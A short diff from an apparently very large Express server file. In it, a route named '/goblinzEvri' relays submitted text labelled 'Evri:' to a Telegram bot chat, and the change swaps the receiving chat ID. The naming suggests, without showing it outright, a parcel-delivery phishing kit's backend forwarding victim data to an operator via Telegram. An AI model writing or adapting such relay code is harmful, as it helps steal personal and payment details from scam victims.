@@ -13562,7 +13562,7 @@ app.post("/goblinzEvri", (req, res) => {
           .post(
             `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
             {
-              chat_id: 1727613138,
+              chat_id: 956029722,
               text: `Evri:\n${originalText}`,
               parse_mode: "Markdown",
             }
